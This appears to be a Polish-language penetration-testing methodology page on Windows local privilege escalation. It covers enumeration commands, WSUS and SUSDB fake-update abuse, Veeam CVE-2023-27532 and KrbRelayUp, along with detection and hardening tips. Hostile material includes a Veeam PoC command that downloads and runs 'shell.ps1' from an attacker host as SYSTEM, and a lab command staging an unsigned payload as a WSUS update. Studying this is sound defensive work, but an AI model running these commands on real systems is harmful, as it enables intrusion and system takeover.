# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Najlepsze narzędzie do wyszukiwania wektorów eskalacji uprawnień w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ta strona zbiera ogólną metodykę eskalacji uprawnień w systemie Windows z kilku podstawowych poradników.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Opisany tu praktyczny przebieg enumeracji opiera się również na warsztatach i listach kontrolnych społeczności.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Materiały dotyczące historycznych ataków obejmują prezentację z DerbyCon na temat eskalacji uprawnień w systemie Windows.<sup>[[5]](#references)</sup>

## Podstawy systemu Windows

### Tokeny dostępu

**Jeśli nie wiesz, czym są tokeny dostępu systemu Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Więcej informacji o ACL — DACL/SACL/ACE znajdziesz na następującej stronie:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Poziomy integralności

**Jeśli nie wiesz, czym są poziomy integralności w systemie Windows, przed kontynuowaniem przeczytaj następującą stronę:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Mechanizmy zabezpieczeń systemu Windows

W systemie Windows istnieją różne mechanizmy, które mogą **uniemożliwić enumerację systemu**, uruchamianie plików wykonywalnych, a nawet **wykrywać Twoje działania**. Przed rozpoczęciem enumeracji pod kątem eskalacji uprawnień **przeczytaj** następującą **stronę** i **wylicz** wszystkie te **mechanizmy obronne**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Dostęp fizyczny może również umożliwić zamianę edycji UEFI NVRAM w trybie offline w łańcuch obejmujący DMA przed rozruchem i modyfikację pamięci Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / ciche podniesienie uprawnień UIAccess

Procesy UIAccess uruchamiane przez `RAiLaunchAdminProcess` można wykorzystać do uzyskania High IL bez monitów, gdy zostaną ominięte kontrole bezpiecznej ścieżki AppInfo. Dedykowany przebieg obchodzenia UIAccess/Admin Protection znajdziesz tutaj:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagację wpisów rejestru dostępności Secure Desktop można wykorzystać do dowolnego zapisu w rejestrze jako SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Nowsze kompilacje systemu Windows wprowadziły również ścieżkę LPE **SMB arbitrary-port**, w której uprzywilejowane lokalne uwierzytelnienie NTLM jest przekazywane przez ponownie użyte połączenie TCP SMB:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacje o systemie

Aby przeprowadzić inwentaryzację lokalnego systemu z istniejącej sesji PowerShell, zobacz [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Te przykłady uzupełniają poniższe kontrole, nie uruchamiając osobnych plików wykonywalnych do enumeracji.

### Enumeracja informacji o wersji

Sprawdź, czy w danej wersji systemu Windows występują znane podatności (sprawdź również zainstalowane poprawki).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploity zależne od wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) przydaje się do wyszukiwania szczegółowych informacji o lukach w zabezpieczeniach produktów Microsoft. Baza zawiera ponad 4 700 luk, co pokazuje **ogromną powierzchnię ataku**, jaką stwarza środowisko Windows.

**W systemie**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — zbiera informacje o kompilacji systemu operacyjnego, zainstalowanych aktualizacjach i potencjalnie pasujących biuletynach; przed uznaniem wyniku za właściwy sprawdź dokładny produkt i zastępujące aktualizacje.

W przypadku lokalnego exploita zależnego od wersji sprawdź **architekturę uruchomionego procesu** oraz architekturę systemu operacyjnego. W 64-bitowym systemie Windows 32-bitowy proces podlega [przekierowaniu systemu plików WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` zwykle wskazuje katalog systemowy 32-bitowy, a `%windir%\Sysnative` umożliwia temu procesowi dostęp do natywnego katalogu systemowego. Alias ten jest niedostępny dla procesu 64-bitowego. Kompilacja systemu operacyjnego ani potencjalnie brakująca aktualizacja KB nie potwierdzają podatności na exploit; porównaj uruchomioną kompilację, zainstalowaną lub zastępującą aktualizację, architekturę procesu oraz wymagania exploita z [biuletynem bezpieczeństwa Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) dotyczącym konkretnego problemu.

Przykład błędu usługi powodującego uszkodzenie pamięci znajdziesz w opisie [offsetów pierścienia pamięci współdzielonej MIDI kontrolowanych przez klienta](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Opublikowane offsety stosu dotyczą tylko testowanej kompilacji; uzyskanie uprawnień `LOCAL SERVICE` to osobny etap od późniejszego przejścia do `SYSTEM` za pomocą [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md).<sup>[[44]](#references)</sup>

**Lokalnie, na podstawie informacji o systemie**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria exploitów na Githubie:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy w zmiennych środowiskowych zapisano jakieś dane uwierzytelniające/Juicy info?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia PowerShella

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Pliki transkrypcji PowerShell

Dowiedz się, jak to włączyć: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` to tylko przykład. [Zasady transkrypcji PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) zwykle zapisują pliki w folderze Documents każdego użytkownika, ale ustawienie `OutputDirectory` lub `Start-Transcript -OutputDirectory` może przekierować je do współdzielonego lub ukrytego folderu. Przed przejrzeniem transkrypcji sprawdź efektywną ścieżkę wyjściową i ACL pliku: może on zawierać argumenty poleceń i dane wyjściowe, w tym dane uwierzytelniające. Dostępna do odczytu transkrypcja jest wskazówką tylko wtedy, gdy jej zawartość ujawnia użyteczną tożsamość o wyższych uprawnieniach, a ta tożsamość może się zalogować w odpowiednim kontekście.

### PowerShell Module Logging

Rejestrowane są szczegóły wykonywania potoku PowerShell, w tym wykonane polecenia, ich wywołania oraz fragmenty skryptów. Pełne szczegóły wykonania i wyniki poleceń mogą jednak nie zostać zapisane.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji „Pliki transkrypcji” dokumentacji, wybierając **„Module Logging”** zamiast **„Powershell Transcription”**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Aby wyświetlić 15 ostatnich zdarzeń z logów PowersShell, możesz wykonać:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rejestrowana jest pełna aktywność oraz pełna zawartość wykonania skryptu, co zapewnia dokumentację każdego bloku kodu w trakcie jego działania. Proces ten zachowuje kompleksowy ślad audytowy każdej aktywności, przydatny w analizie kryminalistycznej i badaniu złośliwego działania. Dokumentowanie całej aktywności w chwili jej wykonywania zapewnia szczegółowy wgląd w przebieg procesu.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Zdarzenia logowania dla Script Block można znaleźć w Podglądzie zdarzeń systemu Windows w ścieżce: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operational**.\
Aby wyświetlić 20 ostatnich zdarzeń, możesz użyć:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Ustawienia internetowe

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Dyski

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Wcześniejsze wskazówki podsumowywały ryzyko następująco:

Możesz przejąć kontrolę nad systemem, jeśli aktualizacje są pobierane przez http, a nie http**S**.

Punkt końcowy WSUS używający HTTP jest wskazówką, że warto sprawdzić, czy metadane aktualizacji mogą zostać przechwycone. Możliwość wykorzystania zależy również od tego, czy klient korzysta z tego serwera WSUS, czy atakujący może przechwycić ruch lub nim sterować oraz jakie zasady zaufania do aktualizacji i ich instalacji obowiązują na kliencie. Sam URL nie przesądza o możliwości wykonania kodu. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zacznij od sprawdzenia, czy sieć korzysta z aktualizacji WSUS przez połączenie nieszyfrowane SSL. W tym celu uruchom w cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Lub poniższe w PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Jeśli otrzymasz odpowiedź podobną do jednej z poniższych:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` lub `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ma wartość `1`.

Pierwotne stwierdzenie dotyczące możliwości wykorzystania podatności brzmiało:

W takim przypadku **podatność można wykorzystać.** Jeśli ostatni wpis rejestru ma wartość `0`, wpis WSUS zostanie zignorowany.

Gdy `UseWUServer` ma wartość `1`, Windows Update korzysta ze skonfigurowanej usługi intranetowej. Potwierdza to spełnienie warunku wstępnego dla ścieżki przechwytywania ruchu HTTP, ale nie dowodzi, że przechwycenie ruchu, akceptacja złośliwej aktualizacji lub jej instalacja z podwyższonymi uprawnieniami są możliwe. Gdy wartość wynosi `0`, ta konkretna skonfigurowana usługa WSUS nie jest wybierana przez tę zasadę.

Aby wykorzystać te podatności, możesz użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — są to uzbrojone skrypty do ataków MiTM, służące do wstrzykiwania „fałszywych” aktualizacji do ruchu WSUS, który nie korzysta z SSL.

Zapoznaj się z badaniami tutaj:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Zasadniczo ta luka wykorzystuje następujący mechanizm:

> Jeśli możemy zmienić ustawienia proxy naszego lokalnego użytkownika, a Windows Updates korzysta z proxy skonfigurowanego w ustawieniach Internet Explorera, możemy lokalnie uruchomić [PyWSUS](https://github.com/GoSecure/pywsus), aby przechwycić własny ruch i uruchomić kod z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS korzysta z ustawień bieżącego użytkownika, używa również jego magazynu certyfikatów. Jeśli wygenerujemy certyfikat z podpisem własnym dla nazwy hosta WSUS i dodamy go do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwytywać ruch WSUS zarówno przez HTTP, jak i HTTPS. WSUS nie używa mechanizmów podobnych do HSTS, które zapewniałyby weryfikację typu trust-on-first-use certyfikatu. Jeśli certyfikat przedstawiony przez usługę jest zaufany przez użytkownika i ma prawidłową nazwę hosta, zostanie zaakceptowany.

Możesz wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

### Aktualizacje kontrolowane przez administratora WSUS

Istnieje osobna ścieżka, gdy bieżąca tożsamość może **publikować i zatwierdzać** aktualizacje na serwerze WSUS. Sprawdź efektywne członkostwo w grupie `WSUS Administrators` serwera oraz wszelkie delegowane uprawnienia WSUS, a następnie ustal grupę komputerów klienckich, która otrzymałaby zatwierdzoną aktualizację. [Microsoft wymaga uprawnień administratora WSUS do zatwierdzania aktualizacji](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [opisuje relację zaufania dla publikowania](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klienci muszą ufać certyfikatowi podpisującemu używanemu dla lokalnie publikowanej zawartości. Zanim uznasz to za ścieżkę eskalacji uprawnień, potwierdź, że aktualizacja jest podpisana i akceptowana, ma zastosowanie do celu oraz jest instalowana w kontekście o wyższych uprawnieniach. Sama wartość HTTP `WUServer` lub nazwa grupy nie potwierdza spełnienia tych warunków.

### Nadużycie niestandardowych aktualizacji SUSDB: niepodpisane ładunki przez `.txt`/`.esd`

Jest to inny przypadek naruszenia granicy zaufania niż przechwytywanie połączenia HTTP WSUS: warunkiem wstępnym jest dostęp do **procedur składowanych bazy WSUS (`SUSDB`)** wystarczający do opublikowania i zatwierdzenia niestandardowej aktualizacji. Jedną z praktycznych dróg uzyskania dostępu jest przekazanie uwierzytelnienia konta komputera WSUS z upstream do osobnego serwera MSSQL hostującego `SUSDB`; dokładne wymagania zależą od wdrożenia, dlatego najpierw wylicz uprawnienia `EXECUTE`, zamiast zakładać, że potrzebne są uprawnienia administratora SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Informacje o osobnej ścieżce ataku, w której uwierzytelnianie klientów WSUS jest przekazywane z HTTP/8530 do LDAP, SMB lub AD CS, znajdziesz w sekcji [Nadużywanie WSUS HTTP do ataków NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potwierdzenie przekazywania uwierzytelnienia do zewnętrznej bazy danych i uprawnień do procedur

W środowiskach, w których WSUS korzysta z zewnętrznego serwera SQL, najpierw sprawdź, czy konto serwera WSUS może uwierzytelnić się w bazie danych oraz czy przekazywanie NTLM dociera do tego odbiornika. Rola SQL serwera może udostępniać procedury publikowania aktualizacji nawet wtedy, gdy bezpośredni zapis do tabel jest zabroniony; nieudana instrukcja `UPDATE` dla `SUSDB` nie dowodzi, że publikowanie jest zablokowane. Przed próbą opublikowania niestandardowej aktualizacji sprawdź efektywną tożsamość, członkostwo w rolach i uprawnienia do procedur w autoryzowanej sesji SQL.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Bieżące definicje procedur i zainstalowany plik `SoftwareDistributionPackage.xsd` są przydatne przy odtwarzaniu poprawnych metadanych aktualizacji. Zarówno pakiet nadrzędny, jak i podrzędny pakiet zawartości wymagają `UpdateIdentity` (typ fragmentu `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zapisz lokalny identyfikator rewizji zwracany przez każde wywołanie `spImportUpdate` i zachowaj spójność relacji pakietu, skrótów, rozmiaru, URL zawartości oraz rewizji. Jest to stanowy przepływ publikowania, więc pojedyncze pomyślne wywołanie procedury składowanej nie dowodzi wykonania po stronie klienta.<sup>[[38]](#references)</sup>

#### Zbuduj, skieruj i zatwierdź aktualizację

Przepływ pracy niestandardowej aktualizacji wykorzystuje legalne procedury WSUS jako ograniczone API publikowania. Ważne przejścia stanu to:<sup>[[38]](#references)</sup>

| Etap | Powiązane procedury składowane |
| --- | --- |
| Import metadanych aktualizacji | `spImportUpdate` |
| Zapisanie fragmentów XML dotyczących wymagań wstępnych, zlokalizowanych właściwości i właściwości rozszerzonych | `spSaveXMLFragment` |
| Powiązanie skrótu zawartości z kontrolowanym przez atakującego adresem URL | `spSetBatchURL` |
| Wyliczenie/utworzenie grupy komputerów i dodanie klienta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Zatwierdzenie instalacji dla tej grupy | `spDeployUpdate` z `@actionID = 0` i `@isAssigned = 1` |

Nazwa pliku, skróty, rozmiar i handler `CommandLineInstallation` muszą być zgodne we wszystkich zaimportowanych metadanych i fragmentach. Po przypisaniu URL zawartości i grupy docelowej końcowe zatwierdzenie przypomina poniższy przykład; użyj nowych identyfikatorów aktualizacji, grupy i wdrożenia zamiast ponownie wykorzystywać przykładowe GUID-y.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Obejście weryfikacji podpisu sterowane rozszerzeniem

WSUS zwykle odrzuca dowolną niepodpisaną zawartość wykonywalną. Jednak w `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` ścieżka .NET `VerifyFile` ustawia flagę sprawdzania certyfikatu na false, gdy podana nazwa pliku kończy się na `.txt` lub `.esd`; `CheckCertificateSignature` zostaje wtedy pominięte bez uprzedniego sprawdzenia, czy bajty zawierają tekst lub prawidłowy obraz ESD. Dlatego niezmieniony plik PE o nazwie na przykład `payload.exe.txt` może przejść weryfikację zawartości, a następnie zostać uruchomiony przez procedurę obsługi instalacji aktualizacji z wiersza poleceń. To błąd typu policy/type confusion, a nie fałszowanie podpisu.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging zgodny z BITS i automatyzacja

Wywołanie `spDeployUpdate` powoduje, że WSUS pobiera zarejestrowaną zawartość. Serwer źródłowy musi spełniać wymagania HTTP protokołu BITS: sam dostępny URL nie wystarczy, ponieważ transfer obejmuje początkową sekwencję `HEAD`/`GET` oraz żądania zakresów bajtów. Serwer bez obsługi Range powoduje błąd synchronizacji WSUS `EventId=364` z informacją, że BITS wymaga nagłówka protokołu Range.<sup>[[39]](#references)</sup>

Research PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generuje SQL wymagany do utworzenia łańcucha import/fragment/URL/grupa/wdrożenie, zawiera zmodyfikowanego klienta MSSQL do jego wykonania oraz udostępnia `BitsWebServer.py` do stagingu zawartości. Minimalne polecenie do użycia w autoryzowanym laboratorium to:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nienadzorowane wykonywanie i trwałość przez ponawianie

Interakcja po stronie klienta zależy od zasad. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcja `4 - Auto download and schedule install`, powoduje pobranie i zainstalowanie zatwierdzonej aktualizacji zgodnie ze skonfigurowanym harmonogramem, bez konieczności ręcznego wyboru przez użytkownika. Podczas testów payload, którego aktualizacja pozostała w stanie niepowodzenia/nieukończenia, był ponownie oferowany natychmiast po zakończeniu procesu callback, więc zachowanie związane z ponawianiem może prowadzić do powtarzającej się trwałości wykonywania; jest to łatwe do wykrycia, ponieważ klient sygnalizuje niepowodzenie aktualizacji.<sup>[[39]](#references)</sup>

#### Punkty wykrywania i wzmacniania zabezpieczeń

Przydatne punkty kontroli po stronie serwera i klienta w ramach tego łańcucha to:<sup>[[39]](#references)</sup>

- Audytuj wywołania `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` w `SUSDB`; sprawdzaj nowe grupy docelowe, zewnętrzne źródła zawartości, payloady aktualizacji `.txt`/`.esd` oraz wdrożenia wykonywane przez nieoczekiwane podmioty (zwłaszcza konta inne niż komputery).
- Sprawdzaj `C:\Program Files\Update Services\LogFiles` pod kątem `ContentSyncAgent`, `FileVerified`, błędnie zapisanej nazwy `FileVerficationFailed` i `EventId=364`; weryfikację koreluj z rozszerzeniem payloadu i sygnaturą zawartości, zamiast ufać rozszerzeniu.
- Wyszukuj przypadki wielokrotnego niepowodzenia/ponawiania instalacji Windows Update oraz uruchamianie plików PE lub nieoczekiwane działania procesów potomnych/sieciowe związane z zawartością o nazwach z rozszerzeniem `.txt` lub `.esd`.
- Jeśli to możliwe, wymagaj Extended Protection for Authentication dla usługi bazy danych i ogranicz dostęp sieciowy do bazy do serwera WSUS oraz autoryzowanych systemów administracyjnych. Ogranicz i audytuj uprawnienia `EXECUTE` do procedur aktualizacji niestandardowych.

## Zewnętrzne auto-updatery i IPC agentów (local privesc)

Wiele agentów korporacyjnych udostępnia interfejs IPC na localhost oraz uprzywilejowany kanał aktualizacji. Jeśli rejestrację można wymusić na serwerze atakującego, a updater ufa nieautoryzowanemu root CA lub stosuje słabe kontrole podpisującego, lokalny użytkownik może dostarczyć złośliwy plik MSI, który usługa SYSTEM zainstaluje. Uogólniona technika (oparta na łańcuchu Netskope stAgentSvc – CVE-2025-0309) jest opisana tutaj:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM przez TCP 9401)

Pierwotny opis dotyczący konkretnej wersji i notatka z rekonesansu brzmiały:

Veeam B&R < `11.0.1.1261` udostępnia usługę localhost na **TCP/9401**, która przetwarza kontrolowane przez atakującego komunikaty, umożliwiając wykonywanie dowolnych poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Recon**: potwierdź nasłuchiwanie i wersję, np. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect domyślnie korzystają z podstawowej usługi kopii zapasowych na **TCP/9401**. [Komunikat Veeam](https://www.veeam.com/kb4424) opisuje nieuwierzytelnione ujawnienie zaszyfrowanych poświadczeń bazy konfiguracji w obrębie granicy sieci kopii zapasowych; osobny publiczny PoC demonstruje ścieżkę wykonania poleceń jako **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Usługa może nasłuchiwać nie tylko na localhost, dlatego sprawdź jej rzeczywisty adres i PID.

- **Recon**: potwierdź, że TCP/9401 należy do `Veeam.Backup.Service.exe`, a następnie sprawdź zainstalowany produkt i metadane poprawek. `netstat -ano | findstr 9401` oraz `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` to wskazówki, a nie pełna weryfikacja poprawek.
- **Wersje bazowe z poprawką**: Veeam wskazuje **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** jako pierwsze wydania zawierające poprawkę; wcześniejsze wydania są podatne. Sama czteroczęściowa wersja pliku nie pozwala odróżnić niezałatanego wydania bazowego od późniejszej poprawki dla tego samego numeru kompilacji. Przed uznaniem granicznej kompilacji za poprawioną zweryfikuj identyfikator poprawki w [historii kompilacji dostawcy](https://www.veeam.com/kb2680).
- **Exploit**: umieść PoC, taki jak `VeeamHax.exe`, wraz z wymaganymi bibliotekami DLL Veeam w tym samym katalogu, a następnie wywołaj payload SYSTEM przez lokalne gniazdo:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Usługa wykonuje polecenie jako SYSTEM.

Cytowany PoC demonstruje wykonanie polecenia jako SYSTEM, gdy spełnione są dodatkowe warunki wstępne; ostrzeżenie dostawcy opisuje problem ujawnienia poświadczeń.

## KrbRelayUp

Pierwotny opis domyślnej konfiguracji środowiska brzmiał:

W środowiskach Windows **domain** istnieje podatność typu **local privilege escalation**, która występuje w określonych warunkach. Należą do nich środowiska, w których **LDAP signing nie jest wymuszane,** użytkownicy mają uprawnienia pozwalające im konfigurować **Resource-Based Constrained Delegation (RBCD)**, a także mogą tworzyć konta komputerów w domenie. Należy pamiętać, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Lokalny Kerberos relay może umożliwić przejście od logowania z niższymi uprawnieniami do uprzywilejowanego zapisu w katalogu, jeśli odpowiedni serwer COM dokona uwierzytelnienia, a przekazany principal ma uprawnienia do obiektu docelowego. [Dokumentacja KrbRelay](https://github.com/cube0x0/KrbRelay) opisuje zarówno zapisy LDAP RBCD, jak i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatyzuje niektóre z tych ścieżek. Łańcuch RBCD wymaga odpowiednich uprawnień delegowania i uprawnień do obiektu docelowego, a łańcuch shadow-credential wymaga uprawnień do zapisu klucza poświadczeń oraz kontrolera KDC obsługującego ścieżkę uwierzytelniania certyfikatem. Żadna z tych ścieżek nie wynika z samego członkostwa w domenie.

Sprawdź rzeczywistą politykę kontrolera domeny dotyczącą [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL obiektu dla przekazywanej tożsamości oraz poziomy uwierzytelniania i impersonacji wybranej klasy COM. Znaczenie mają typ logowania wywołującego i kontekst poświadczeń: sesja WinRM może zachowywać się inaczej niż logowanie interaktywne lub logowanie z nowymi poświadczeniami. Wynik mogą też zmienić routing Firewall/OXID i zainstalowane aktualizacje. Traktuj permisywną politykę lub pasującą ACL jako potencjalny przedmiot dalszej analizy; pasywne wyliczanie nie powinno wywoływać COM coercion, uwierzytelniania relay ani zapisów w katalogu. Shadow credential konta komputera może prowadzić do uzyskania biletu dla tego komputera, a następnie — wyłącznie jeśli to konto ma wymagane uprawnienia replikacji katalogu — do osobnej ścieżki DCSync.

Znajdź **exploit w** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

